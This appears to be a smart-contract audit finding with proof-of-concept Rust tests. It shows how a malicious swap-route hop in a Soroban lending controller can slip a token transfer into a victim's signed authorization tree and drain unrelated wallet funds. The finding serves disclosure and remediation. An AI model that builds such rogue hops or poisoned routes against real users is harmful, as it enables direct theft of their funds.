### Title

Nested route code can append unauthorized wallet transfers to the caller’s authorization tree - (File: `contracts/controller/src/strategies/swap.rs`)

### Summary

Strategy entrypoints accept opaque swap payloads and execute them through the configured router. Because nested route contracts run beneath the user-authorized controller invocation, a malicious hop can call `transfer(victim, attacker, amount)` on an unrelated token. Transaction simulation records that transfer as a child authorization; if the victim signs the simulated tree, the transfer succeeds even though the controller only intended to authorize the strategy.

### Finding Description

`multiply`, `swap_debt`, `swap_collateral`, and `repay_debt_with_collateral` all route caller-controlled swap bytes through `swap_tokens` or `swap_tokens_or_passthrough`. `swap_tokens` authenticates only the controller’s exact input-token transfer to the router, then invokes `router.execute_strategy` inside the flash guard. [1](#0-0) 

That check bounds the controller’s own input authorization, but it does not constrain authorization requests made by contracts reachable through the route. A malicious route hop can invoke an unrelated token’s `transfer` function against the original caller. Soroban records that nested transfer beneath the user’s `swap_collateral` authorization; if the resulting tree is signed, enforcement accepts it and moves the victim’s wallet funds. The regression test demonstrates a debt-free victim losing an unrelated token while receiving a valid swap output. [2](#0-1) 

### Impact Explanation

An unprivileged attacker can steal arbitrary tokens held by a user who submits a poisoned route. The theft is not limited to collateral routed through the lending transaction: the nested call can transfer unrelated wallet assets to the attacker. This is direct theft of user funds and remains possible even when the strategy satisfies its measured-output and solvency checks.

### Likelihood Explanation

Exploitation requires the victim to use an attacker-influenced route and sign the authorization tree returned by simulation. Wallets or integrations that submit opaque route payloads without decoding nested authorizations make this reachable through normal `swap_collateral`, `swap_debt`, `repay_debt_with_collateral`, or `multiply` calls. The honest authorization tree rejects the rogue transfer, but the simulated poisoned tree explicitly authorizes it. [3](#0-2) 

### Recommendation

Constrain swap routes to an allowlisted set of venue contracts and permitted function selectors, or introduce a protocol-validated route representation that rejects arbitrary contract invocation targets. Until routes are constrained, clients must simulate transactions, decode every `SorobanAuthorizedInvocation`, and reject any child invocation other than the expected strategy input transfer. Documentation alone does not prevent malicious routes from reaching this behavior.

### Proof of Concept

1. Deploy a malicious hop contract whose `swap` function calls `unrelated_token.transfer(victim, attacker, amount)`. The test’s `RogueHopPool` stores exactly this plan. [4](#0-3) 
2. Construct route bytes naming that hop while still paying a fair output token amount. [5](#0-4) 
3. Have the victim call `Controller::swap_collateral(caller, account_id, current, amount, new, route)`. `swap_collateral` forwards the opaque bytes into the strategy path. [6](#0-5) 
4. During simulation, the rogue token transfer is recorded as a child of the victim’s controller authorization. [7](#0-6) 
5. If the victim signs the returned tree, enforcing mode executes the nested transfer; the victim’s unrelated-token balance becomes zero and the attacker receives it. [8](#0-7)

fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);

#[test]
fn enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer() {
    let s = Scene::new();

    // Control: a pool that touches nothing passes with the honest root-only tree.
    let benign = s.route_through_pool_stealing(0);
    s.try_swap_with_signed_tree(&benign, &[])
        .expect("the honest tree authorizes an honest route");
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);

    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
